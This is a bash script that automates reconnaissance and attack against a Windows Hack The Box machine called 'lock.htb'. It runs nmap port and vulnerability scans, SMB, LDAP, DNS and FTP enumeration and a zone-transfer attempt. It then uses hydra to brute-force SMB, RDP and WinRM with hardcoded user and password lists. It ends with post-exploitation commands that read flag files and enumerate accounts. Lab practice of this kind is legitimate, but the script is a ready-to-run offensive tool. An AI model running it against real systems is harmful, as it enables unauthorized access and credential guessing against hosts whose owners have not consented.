#!/bin/bash
# SYSTEM 4: LOCK (Windows) - COMPLETE RECONNAISSANCE & EXPLOITATION
# IP: 10.129.6.226

S4_IP="10.129.6.226"
S4_NAME="lock.htb"
S4_OS="Windows"
OUTPUT_DIR="$HOME/Downloads/system4_lock_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 4: LOCK (Windows) - COMPLETE TEST"
echo "=========================================="
echo "IP: $S4_IP"
echo "Output: $OUTPUT_DIR"
echo ""

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================
echo "[*] Phase 1: Reconnaissance"

# Basic connectivity
echo "[+] Testing connectivity..."
ping -c 4 $S4_IP > 01_ping.txt 2>&1
cat 01_ping.txt

# Initial port scan
echo "[+] Running initial Nmap scan..."
nmap -sC -sV -oN 02_initial_scan.txt $S4_IP
echo "[+] Initial scan complete"

# Full port scan (background)
echo "[+] Starting full port scan in background..."
nmap -p- --min-rate 2000 -oN 03_full_scan.txt $S4_IP &
FULL_SCAN_PID=$!

# UDP scan for common ports (background)
echo "[+] Starting UDP scan in background..."
nmap -sU --top-ports 100 -oN 04_udp_scan.txt $S4_IP &
UDP_SCAN_PID=$!

# Web enumeration (if port 80/443)
echo "[+] Checking for web services..."
if nmap -p 80,443,8080,8443 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] Web service detected, enumerating..."
    curl -s -L http://$S4_IP/ > 05_web_root.html 2>&1
    curl -s -L https://$S4_IP/ > 06_web_root_https.html 2>&1
    curl -s http://$S4_IP/robots.txt > 07_robots.txt 2>&1
    curl -s http://$S4_IP/sitemap.xml > 08_sitemap.xml 2>&1
    
    # Directory enumeration
    echo "[+] Running directory enumeration..."
    ffuf -u http://$S4_IP/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50 -o 09_ffuf_common.json -s 2>/dev/null &
fi

# SMB enumeration (Windows - likely port 445)
echo "[+] Enumerating SMB (port 445)..."
nmap -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-* -oN 10_smb_detailed.txt $S4_IP &
enum4linux -a $S4_IP > 11_enum4linux.txt 2>&1 &
smbclient -L //$S4_IP/ -N > 12_smbclient.txt 2>&1 &
smbmap -H $S4_IP > 13_smbmap.txt 2>&1 &

# RDP enumeration (Windows - likely port 3389)
echo "[+] Checking RDP (port 3389)..."
if nmap -p 3389 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] RDP detected, gathering info..."
    nc $S4_IP 3389 < /dev/null > 14_rdp_banner.txt 2>&1
    nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -oN 15_rdp_info.txt $S4_IP &
fi

# LDAP enumeration (Windows Domain - likely port 389/636)
echo "[+] Checking LDAP (ports 389/636)..."
if nmap -p 389,636 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] LDAP detected, enumerating..."
    nmap -p 389,636 --script ldap-rootdse,ldap-search -oN 16_ldap_info.txt $S4_IP &
    ldapsearch -x -H ldap://$S4_IP -s base > 17_ldap_base.txt 2>&1 &
fi

# DNS enumeration (Windows Domain - likely port 53)
echo "[+] Checking DNS (port 53)..."
if nmap -p 53 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] DNS detected, attempting zone transfer..."
    dig @$S4_IP axfr > 18_dns_axfr.txt 2>&1
    nmap -p 53 --script dns-zone-transfer,dns-service-discovery -oN 19_dns_info.txt $S4_IP &
fi

# FTP enumeration (if port 21)
echo "[+] Checking FTP (port 21)..."
if nmap -p 21 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] FTP detected, testing anonymous..."
    ftp -n $S4_IP <<EOF > 20_ftp_anon.txt 2>&1
user anonymous anonymous
pwd
ls
quit
EOF
    nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst -oN 21_ftp_info.txt $S4_IP &
fi

# NetBIOS enumeration (Windows - port 137/139)
echo "[+] Enumerating NetBIOS..."
nbtscan $S4_IP > 22_nbtscan.txt 2>&1 &
nmap -p 137,139 --script nbstat -oN 23_netbios_info.txt $S4_IP &

# ============================================
# PHASE 2: VULNERABILITY ANALYSIS
# ============================================
echo "[*] Phase 2: Vulnerability Analysis"

# Comprehensive vulnerability scan
echo "[+] Running vulnerability scan..."
nmap --script vuln -oN 24_vuln_scan.txt $S4_IP &

# Windows-specific vulnerability checks
echo "[+] Checking Windows-specific vulnerabilities..."
nmap --script smb-vuln-*,rdp-vuln-*,msrpc-vuln-* -oN 25_windows_vuln.txt $S4_IP &

# Service version vulnerabilities
echo "[+] Searching for exploits..."
searchsploit windows > 26_windows_exploits.txt 2>&1

# ============================================
# PHASE 3: EXPLOITATION ATTEMPTS
# ============================================
echo "[*] Phase 3: Exploitation"

# Create wordlists
echo "[+] Creating wordlists..."
cat > users_windows.txt <<EOF
administrator
admin
guest
user
test
lock
LOCK
Administrator
Admin
EOF

cat > pass_windows.txt <<EOF
password
Password123
P@ssw0rd
admin
Admin123
Welcome123
lock
LOCK
Lock123
Summer2024
Winter2024
Spring2024
Fall2024
EOF

# SMB brute force (if port 445)
echo "[+] Attempting SMB brute force..."
if nmap -p 445 $S4_IP 2>/dev/null | grep -q "open"; then
    hydra -L users_windows.txt -P pass_windows.txt smb://$S4_IP -t 4 -o 27_smb_brute.txt 2>&1 &
fi

# RDP brute force (if port 3389)
echo "[+] Attempting RDP brute force..."
if nmap -p 3389 $S4_IP 2>/dev/null | grep -q "open"; then
    hydra -L users_windows.txt -P pass_windows.txt rdp://$S4_IP -t 4 -o 28_rdp_brute.txt 2>&1 &
fi

# WinRM brute force (if port 5985/5986)
echo "[+] Checking WinRM (ports 5985/5986)..."
if nmap -p 5985,5986 $S4_IP 2>/dev/null | grep -q "open"; then
    echo "[+] WinRM detected, attempting brute force..."
    hydra -L users_windows.txt -P pass_windows.txt winrm://$S4_IP -t 4 -o 29_winrm_brute.txt 2>&1 &
fi

# SMB null session check
echo "[+] Testing SMB null session..."
smbclient -L //$S4_IP/ -N -U "" > 30_smb_null.txt 2>&1

# SMB anonymous access
echo "[+] Testing SMB anonymous access..."
smbclient //$S4_IP/ -N -U "guest" <<EOF > 31_smb_guest.txt 2>&1
ls
quit
EOF

# ============================================
# PHASE 4: WAIT FOR BACKGROUND JOBS
# ============================================
echo ""
echo "[*] Waiting for background scans to complete..."
wait $FULL_SCAN_PID 2>/dev/null
wait $UDP_SCAN_PID 2>/dev/null
echo "[+] Background scans complete"

# ============================================
# PHASE 5: POST-EXPLOITATION (if access gained)
# ============================================
echo "[*] Phase 5: Post-Exploitation Commands"
echo ""
echo "If you gain access via SMB/RDP/WinRM, run these commands:"
echo ""
echo "Windows Commands:"
echo "  - whoami"
echo "  - hostname"
echo "  - systeminfo"
echo "  - ipconfig /all"
echo "  - net user"
echo "  - net localgroup administrators"
echo "  - type C:\\Users\\Administrator\\Desktop\\root.txt"
echo "  - type C:\\Users\\Public\\user.txt"
echo "  - dir C:\\Users\\*\\Desktop\\user.txt /s"
echo "  - dir C:\\Users\\*\\Desktop\\root.txt /s"
echo "  - reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters"
echo "  - net share"
echo "  - netstat -ano"
echo ""

# ============================================
# SUMMARY
# ============================================
echo "=========================================="
echo "SYSTEM 4: LOCK - SCAN COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
echo ""
echo "Key files to review:"
echo "  - 02_initial_scan.txt (Initial port scan)"
echo "  - 03_full_scan.txt (Full port scan)"
echo "  - 10_smb_detailed.txt (SMB enumeration)"
echo "  - 11_enum4linux.txt (SMB enumeration)"
echo "  - 24_vuln_scan.txt (Vulnerability scan)"
echo "  - 27_smb_brute.txt (SMB brute force results)"
echo "  - 28_rdp_brute.txt (RDP brute force results)"
echo ""
ls -lh "$OUTPUT_DIR" | head -20
echo ""
echo "Next steps:"
echo "  1. Review scan results"
echo "  2. Identify open services and vulnerabilities"
echo "  3. Attempt exploitation based on findings"
echo "  4. Document all results"

